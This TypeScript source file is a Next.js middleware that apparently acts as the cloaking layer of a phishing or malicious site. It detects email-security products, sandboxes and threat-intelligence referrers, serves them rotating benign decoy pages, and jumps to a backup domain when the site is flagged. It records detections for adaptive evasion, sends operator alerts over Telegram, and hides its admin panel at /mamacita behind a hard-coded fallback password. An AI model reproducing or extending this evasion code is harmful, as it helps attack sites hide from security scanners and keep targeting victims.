import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'
import { getCachedSettings } from './lib/adminSettings'
import { checkNetworkRestrictions } from './lib/networkRestrictions'
import { detectBotWithCloudflare, shouldRedirectToSafeSite } from './lib/cloudflareBotManagement'
import { getRandomSafeRedirect } from './lib/scannerDetection'
import { isIPBlocked } from './lib/ipBlocklist'
import { detectSandbox } from './lib/sandboxDetection'
import { smartDetectSandbox } from './lib/smartSandboxDetection'
import { getRandomTemplate } from './lib/benignTemplates'
import { recordDetectionEvent } from './lib/adaptiveEvasion'
import { isDomainFlagged, getBackupDomain } from './lib/domainReputation'

// Middleware runs in Edge runtime by default (faster, works with Web Crypto API)

// Silent scanner detection
// Note: /admin and /api/admin are legitimate routes, not suspicious
const suspiciousPatterns = [
  '/wp-', '/php', '/.env', '/.git',
  '/config', '/backup', '/test', '/debug',
  '/administrator', '/phpmyadmin', '/hidden',
  '/secret', '/database', '/console'
]

const isSuspiciousPath = (path: string) => {
  return suspiciousPatterns.some(pattern => path.includes(pattern))
}

// Whitelist legitimate admin routes (hidden at /mamacita)
const isAdminRoute = (path: string) => {
  return path.startsWith('/mamacita') || path.startsWith('/api/mamacita')
}

// Helper function to log bot detection (non-blocking)
async function logBotDetection(
  request: NextRequest,
  ip: string,
  userAgent: string,
  reason: string,
  confidence: number = 0
) {
  try {
    // Make internal API call to log visitor
    const origin = request.nextUrl.origin
    await fetch(`${origin}/api/internal/log-visitor`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-internal-request': 'true', // Mark as internal request
      },
      body: JSON.stringify({
        ip,
        userAgent,
        botStatus: 'bot',
        layer: 'middleware',
        layerPassed: false,
        reason,
        confidence,
      }),
    }).catch(() => {
      // Silent fail - don't block middleware if logging fails
    })
  } catch (error) {
    // Silent fail - don't block middleware if logging fails
  }
}

export async function middleware(request: NextRequest) {
  // Early comprehensive bot detection - redirect bots/scanners before they see anything
  // Uses Cloudflare Bot Management + custom detection
  
  const userAgent = request.headers.get('user-agent') || 'Unknown'
  const referrer = request.headers.get('referer') || request.headers.get('referrer') || ''
  const ip =
    request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
    request.headers.get('x-real-ip') ||
    request.headers.get('cf-connecting-ip') ||
    'Unknown'

  const { pathname } = request.nextUrl

  // ====================================================================
  // SECURITY BLOCKING - Replicate .htaccess rules
  // ====================================================================
  
  // Import blocking functions
  const { isIPBlocked: checkIPBlocked, isUserAgentBlocked, isReferrerBlocked } = await import('./lib/blockedLists')
  
  // Block malicious IPs (security scanners)
  if (checkIPBlocked(ip)) {
    return new NextResponse(null, { status: 403 }) // Forbidden
  }
  
  // Block malicious user agents (bots, scanners, security tools)
  if (isUserAgentBlocked(userAgent)) {
    return new NextResponse(null, { status: 403 }) // Forbidden
  }
  
  // Block threat intelligence referrers
  if (isReferrerBlocked(referrer)) {
    return new NextResponse(null, { status: 403 }) // Forbidden
  }
  
  // Block direct access to /page directory
  if (pathname.startsWith('/page')) {
    return NextResponse.json({ error: 'Not Found' }, { status: 404 })
  }
  
  // ====================================================================
  // END SECURITY BLOCKING
  // ====================================================================

  // Protect admin routes (except login)
  if (pathname.startsWith('/mamacita') && !pathname.startsWith('/mamacita/login')) {
    const authCookie = request.cookies.get('admin_auth')
    const sessionCookie = request.cookies.get('admin_session')
    const adminPassword = process.env.ADMIN_PASSWORD || 'admin123'
    
    // Check if cookies exist and password matches
    if (!authCookie || !sessionCookie || authCookie.value !== adminPassword) {
      const loginUrl = new URL('/mamacita/login', request.url)
      const response = NextResponse.redirect(loginUrl)
      response.cookies.delete('admin_auth')
      response.cookies.delete('admin_session')
      return response
    }
    
    // Check session expiry
    try {
      const sessionData = JSON.parse(atob(sessionCookie.value))
      const now = Date.now()
      
      // Check if session has expired (30 minutes of inactivity)
      if (now > sessionData.expiry) {
        const loginUrl = new URL('/admin/login', request.url)
        const response = NextResponse.redirect(loginUrl)
        response.cookies.delete('admin_auth')
        response.cookies.delete('admin_session')
        return response
      }
      
      // Session valid - update last activity and extend expiry
      sessionData.lastActivity = now
      sessionData.expiry = now + (30 * 60 * 1000) // Extend by 30 minutes
      const newSessionToken = Buffer.from(JSON.stringify(sessionData)).toString('base64')
      
      const response = NextResponse.next()
      response.headers.set('X-Frame-Options', 'DENY')
      response.headers.set('X-Content-Type-Options', 'nosniff')
      
      // Update session cookie with new expiry
      response.cookies.set('admin_session', newSessionToken, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict',
        maxAge: 30 * 60
      })
      response.cookies.set('admin_auth', adminPassword, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict',
        maxAge: 30 * 60
      })
      
      return response
    } catch (error) {
      // Invalid session data
      const loginUrl = new URL('/admin/login', request.url)
      const response = NextResponse.redirect(loginUrl)
      response.cookies.delete('admin_auth')
      response.cookies.delete('admin_session')
      return response
    }
  }

  // Skip detection for static files, API routes, admin routes (mamacita), and templates
  if (
    pathname.startsWith('/_next') ||
    pathname.startsWith('/api') ||
    pathname.startsWith('/mamacita') ||
    pathname.startsWith('/benign-templates') ||
    pathname.startsWith('/favicon') ||
    pathname.includes('.')
  ) {
    return NextResponse.next()
  }

  // LOAD SETTINGS FROM CACHE
  const settings = getCachedSettings()
  
  // Skip security in development if configured
  if (process.env.NODE_ENV === 'development' && !settings.security?.gates?.layer1BotFilter) {
    const response = NextResponse.next()
    response.headers.set('X-Frame-Options', 'DENY')
    response.headers.set('X-Content-Type-Options', 'nosniff')
    return response
  }

  // === SMART SANDBOX DETECTION (Layer 0) ===
  let smartDetectionResult: any = null
  try {
    // Use smart detection (distinguishes real users from sandboxes)
    smartDetectionResult = await smartDetectSandbox(request)

    // Only block HIGH CONFIDENCE sandboxes (80+)
    if (smartDetectionResult.isSandbox && smartDetectionResult.confidence >= 80) {
      // Log bot detection to visitor tracker
      await logBotDetection(
        request,
        ip,
        userAgent,
        `Sandbox detected: ${smartDetectionResult.reasons.slice(0, 2).join(', ')}`,
        smartDetectionResult.confidence
      )
      
      // Send Telegram notification via internal API (Edge runtime safe)
      // Check environment variables directly (Edge runtime safe)
      const telegramEnabled = process.env.TELEGRAM_BOT_TOKEN && 
                             process.env.TELEGRAM_CHAT_ID &&
                             process.env.DISABLE_BOT_NOTIFICATIONS !== 'true'
      
      if (telegramEnabled) {
        // Call the internal notification API (it will handle settings check)
        await fetch(`${request.nextUrl.origin}/api/internal/send-bot-notification`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-internal-request': 'true'
          },
          body: JSON.stringify({
            ip,
            userAgent,
            reason: `Sandbox detected: ${smartDetectionResult.reasons.slice(0, 2).join(', ')}`,
            confidence: smartDetectionResult.confidence,
            layer: 'middleware',
            blockedAt: new Date().toISOString()
          }),
        }).catch(() => {
          // Silent fail
        })
      }

      // Record event for learning
      await recordDetectionEvent({
        timestamp: new Date().toISOString(),
        technique: 'template-rotation',
        wasDetected: false, // We successfully blocked it
        confidence: smartDetectionResult.confidence,
      }).catch(() => {
        // Silent fail
      })

      // Serve benign template
      const template = getRandomTemplate('')
      const templateUrl = new URL(template.path, request.url)
      return NextResponse.rewrite(templateUrl)
    }

    // Check domain reputation
    const domain = request.nextUrl.hostname
    if (domain && domain !== 'localhost' && !domain.includes('127.0.0.1')) {
      const flagged = await isDomainFlagged(domain).catch(() => false)
      if (flagged) {
        const backup = getBackupDomain()
        return NextResponse.redirect(
          new URL(request.nextUrl.pathname, `https://${backup}`)
        )
      }
    }
  } catch (error) {
    // On error, allow through (fail open)
  }

  // If smart detection confirmed real user, skip old bot detection
  if (smartDetectionResult && smartDetectionResult.realUserScore >= 50) {
    const response = NextResponse.next()
    response.headers.set('X-Frame-Options', 'DENY')
    response.headers.set('X-Content-Type-Options', 'nosniff')
    response.headers.set('Referrer-Policy', 'no-referrer')
    response.headers.set(
      'Content-Security-Policy',
      "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://challenges.cloudflare.com https://challenges.cloudflare.com/turnstile/v0/api.js; style-src 'self' 'unsafe-inline' https://challenges.cloudflare.com; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://challenges.cloudflare.com https://api.telegram.org https://ipapi.co; frame-src https://challenges.cloudflare.com;"
    )
    return response
  }

  // Silent redirect for scanner paths
  if (isSuspiciousPath(pathname)) {
    const redirectUrl = settings.redirects?.customUrl || 'https://en.wikipedia.org/wiki/Cloud_computing'
    return NextResponse.redirect(new URL(redirectUrl, request.url))
  }

  // SECURITY CHECK 1: IP Blocklist (if enabled in settings)
  if (settings.security?.gates?.layer1IpBlocklist !== false) {
    if (await isIPBlocked(ip)) {
      // Log bot detection to visitor tracker
      await logBotDetection(
        request,
        ip,
        userAgent,
        'IP in blocklist',
        100
      )
      
      // Send Telegram notification via internal API (Edge runtime safe)
      const telegramEnabled = process.env.TELEGRAM_BOT_TOKEN && 
                             process.env.TELEGRAM_CHAT_ID &&
                             process.env.DISABLE_BOT_NOTIFICATIONS !== 'true'
      
      if (telegramEnabled) {
        await fetch(`${request.nextUrl.origin}/api/internal/send-bot-notification`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-internal-request': 'true'
          },
          body: JSON.stringify({
            ip,
            userAgent,
            reason: 'IP in blocklist',
            confidence: 100,
            layer: 'middleware',
            blockedAt: new Date().toISOString()
          }),
        }).catch(() => {
          // Silent fail
        })
      }
      
      const redirectUrl = settings.redirects?.customUrl || getRandomSafeRedirect()
      return NextResponse.redirect(new URL(redirectUrl, request.url), 302)
    }
  }

  // SECURITY CHECK 2: Network Restrictions (if enabled in settings)
  // Note: Network restrictions are checked as part of bot filter, but can also be checked here
  // For now, we'll check them if bot filter is enabled
  if (settings.security?.gates?.layer1BotFilter !== false) {
    const networkCheck = await checkNetworkRestrictions(ip, settings)
    if (networkCheck.blocked) {
      // Log bot detection to visitor tracker
      await logBotDetection(
        request,
        ip,
        userAgent,
        networkCheck.reason || 'Network restriction',
        80
      )
      
      // Send Telegram notification via internal API (Edge runtime safe)
      const telegramEnabled = process.env.TELEGRAM_BOT_TOKEN && 
                             process.env.TELEGRAM_CHAT_ID &&
                             process.env.DISABLE_BOT_NOTIFICATIONS !== 'true'
      
      if (telegramEnabled) {
        await fetch(`${request.nextUrl.origin}/api/internal/send-bot-notification`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-internal-request': 'true'
          },
          body: JSON.stringify({
            ip,
            userAgent,
            reason: networkCheck.reason || 'Network restriction',
            confidence: 80,
            layer: 'middleware',
            blockedAt: new Date().toISOString()
          }),
        }).catch(() => {
          // Silent fail
        })
      }
      
      const redirectUrl = settings.redirects?.customUrl || getRandomSafeRedirect()
      return NextResponse.redirect(new URL(redirectUrl, request.url), 302)
    }
  }

  // Enhanced headers for security tool detection
  const allHeaders: Record<string, string | null> = {}
  const securityHeaders = [
    'x-proofpoint', 'x-mimecast', 'x-barracuda', 'x-forcepoint',
    'x-symantec', 'x-mcafee', 'x-trendmicro', 'x-sophos',
    'x-kaspersky', 'x-bitdefender', 'x-fireeye', 'x-checkpoint',
    'x-zscaler', 'x-fortinet', 'x-debug', 'x-test', 'x-inspector',
  ]
  
  securityHeaders.forEach(header => {
    allHeaders[header] = request.headers.get(header)
  })
  
  // Comprehensive bot detection with Cloudflare + security tool detection
  const detection = detectBotWithCloudflare(userAgent, ip, request.headers, {
    fingerprint: JSON.stringify(allHeaders),
  })

  // Silent detection - no logging

  // Enhanced detection: Check for security tool specific patterns
  const uaLower = userAgent.toLowerCase()
  const isSecurityTool = 
    uaLower.includes('proofpoint') ||
    uaLower.includes('mimecast') ||
    uaLower.includes('barracuda') ||
    uaLower.includes('forcepoint') ||
    uaLower.includes('symantec') ||
    uaLower.includes('mcafee') ||
    uaLower.includes('trendmicro') ||
    uaLower.includes('sophos') ||
    uaLower.includes('kaspersky') ||
    uaLower.includes('bitdefender') ||
    uaLower.includes('fireeye') ||
    uaLower.includes('checkpoint') ||
    uaLower.includes('zscaler') ||
    uaLower.includes('fortinet') ||
    securityHeaders.some(h => request.headers.get(h) !== null)

  // SECURITY CHECK 3: Bot Detection (if enabled in settings)
  if (settings.security?.gates?.layer1BotFilter !== false) {
    // Get threshold from settings
    const threshold = settings.security?.botFilter?.confidenceThreshold || 70
    
    // Only redirect on HIGH confidence bot detection (>= threshold) or explicit security tools
    // Allow legitimate users with low Cloudflare scores to proceed to CAPTCHA
    const shouldRedirect = 
      isSecurityTool || // Always redirect security tools
      (detection.confidence >= threshold && detection.isBot) || // High confidence bots only
      (detection.cloudflareScore?.automatedTool === true) || // Explicit automated tools
      (detection.cloudflareScore?.verifiedBot === true) // Verified bots

    if (shouldRedirect) {
      // Log bot detection to visitor tracker
      const botReason = isSecurityTool 
        ? 'Security tool detected' 
        : `Bot detected (confidence: ${detection.confidence}%)`
      
      await logBotDetection(
        request,
        ip,
        userAgent,
        botReason,
        detection.confidence
      )
      
      // Send Telegram notification via internal API (Edge runtime safe)
      const telegramEnabled = process.env.TELEGRAM_BOT_TOKEN && 
                             process.env.TELEGRAM_CHAT_ID &&
                             process.env.DISABLE_BOT_NOTIFICATIONS !== 'true'
      
      if (telegramEnabled) {
        await fetch(`${request.nextUrl.origin}/api/internal/send-bot-notification`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-internal-request': 'true'
          },
          body: JSON.stringify({
            ip,
            userAgent,
            reason: botReason,
            confidence: detection.confidence,
            layer: 'middleware',
            blockedAt: new Date().toISOString()
          }),
        }).catch(() => {
          // Silent fail
        })
      }
      
      const redirectUrl = settings.redirects?.customUrl || getRandomSafeRedirect()
      return NextResponse.redirect(new URL(redirectUrl, request.url), 302)
    }
  }

  // SECURITY CHECK 4: Sandbox Detection (if enabled in settings)
  if (settings.security?.gates?.layer1ScannerDetection !== false) {
    // Use the existing smart sandbox detection that already runs above
    // This check is already handled in the smart detection section
  }

  // All checks passed - legitimate users will see CAPTCHA
  const response = NextResponse.next()

  // Security headers
  response.headers.set('X-Frame-Options', 'DENY')
  response.headers.set('X-Content-Type-Options', 'nosniff')
  response.headers.set('Referrer-Policy', 'no-referrer')
  response.headers.set(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://challenges.cloudflare.com https://challenges.cloudflare.com/turnstile/v0/api.js; style-src 'self' 'unsafe-inline' https://challenges.cloudflare.com; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://challenges.cloudflare.com https://api.telegram.org https://ipapi.co; frame-src https://challenges.cloudflare.com;"
  )

  // HSTS (only on HTTPS)
  if (request.nextUrl.protocol === 'https:') {
    response.headers.set(
      'Strict-Transport-Security',
      'max-age=31536000; includeSubDomains; preload'
    )
  }

  // Cache control for API routes
  if (request.nextUrl.pathname.startsWith('/api/')) {
    response.headers.set('Cache-Control', 'no-store, no-cache, must-revalidate, private')
  }

  return response
}

export const config = {
  matcher: [
    /*
     * Match all request paths except for the ones starting with:
     * - _next/static (static files)
     * - _next/image (image optimization files)
     * - favicon.ico (favicon file)
     */
    '/((?!_next/static|_next/image|favicon.ico).*)',
  ],
}

